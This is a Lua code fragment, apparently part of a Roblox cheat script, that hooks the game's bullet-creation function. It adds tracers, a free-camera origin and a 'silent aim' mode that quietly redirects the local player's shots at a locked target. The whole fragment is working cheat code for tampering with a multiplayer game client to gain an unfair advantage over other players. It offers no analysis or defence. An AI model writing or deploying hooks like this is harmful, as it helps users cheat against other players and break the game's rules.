hooked_newbullet = function(tag, player, cf, speed, power, pellet, sniper, tracer)
    local orig = original_newbullet
    if not orig then return end
    if player == LocalPlayer then
        last_bullet_speed = speed
        if Toggles.TracerEnabled and Toggles.TracerEnabled.Value then
            drawTracer(cf.Position, cf.LookVector)
        end
    end
    if player ~= LocalPlayer then
        return orig(tag, player, cf, speed, power, pellet, sniper, tracer)
    end
    local effectiveCF = cf
    if freeCamActive and Toggles.FreeCamEnabled and Toggles.FreeCamEnabled.Value and freeCamCFrame then
        effectiveCF = freeCamCFrame
    end
    if not (Toggles.SilentAimEnabled and Toggles.SilentAimEnabled.Value) or not locked_player then
        return orig(tag, player, effectiveCF, speed, power, pellet, sniper, tracer)
    end
    local ok, newCF = pcall(buildAimCFrame, effectiveCF, speed)
    if ok and newCF then
        return orig(tag, player, newCF, speed, power, pellet, sniper, tracer)
    else
        return orig(tag, player, effectiveCF, speed, power, pellet, sniper, tracer)
    end
end

